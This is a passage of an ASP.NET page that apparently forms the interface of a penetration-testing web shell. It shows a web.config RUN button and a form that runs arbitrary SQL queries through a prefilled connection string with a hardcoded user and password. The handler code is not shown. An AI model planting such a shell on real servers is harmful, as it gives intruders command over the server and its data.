				<asp:Button id="WebConfig" OnCommand="RunCmd" CommandArgument="webconf" runat="server" Width="100px" Text="RUN"></asp:Button>
			</td>
        </tr>                     
		<tr>
			<td valign="middle" width ="100" bgcolor="#CCCCCC" align="center">
				<strong><span class="style21"><span class="style20">STEP 3</span></span></strong></a><Br>
			</td>	
			<td valign="middle" width ="150" bgcolor="#A0A0A0" align="center" >
				<strong>EXECUTE SQL QUERIES</strong></a><Br>
			</td>
			<td valign="top" bgcolor="#CCCCCC" align="left">
				Connection Strings:<br> 
				<asp:TextBox id="conn" runat="server" Text="Data Source=localhost\sqlexpress2k8;User ID=netspi;PWD=ipsten" width="350">Data Source=localhost\sqlexpress2k8;User ID=netspi;PWD=ipsten</asp:TextBox><br><br>
				SQL query:<br> 
				<asp:TextBox id="query" runat="server" Text="select @@version;" width="350">select @@version;</asp:TextBox> 			
			</td>
			<td valign="middle" bgcolor="#CCCCCC" align="center" onMouseOver="style.backgroundColor='#CCFF99';" onMouseOut="style.backgroundColor='#CCCCCC'">
				<strong><span class="style21"><span class="style20">RUN</span></span></strong><Br>
				<asp:Button id="SqlQuery" OnCommand="RunCmd" CommandArgument="sqlquery" runat="server" Width="100px" Text="RUN"></asp:Button>
			</td>
        </tr>                     
    </table>	
</form>
	
<table border="0" cellspacing="4" cellpadding="4">
	<tr>
		<td valign="top" width ="735" bgcolor="#CCCCCC" align="left">
			<asp:Label id="result" runat="server"></asp:Label>
			<font color="555555"><asp:Label id="history" runat="server"></asp:Label></font>
		</td>
	</tr>
</table>
</body>
</html>
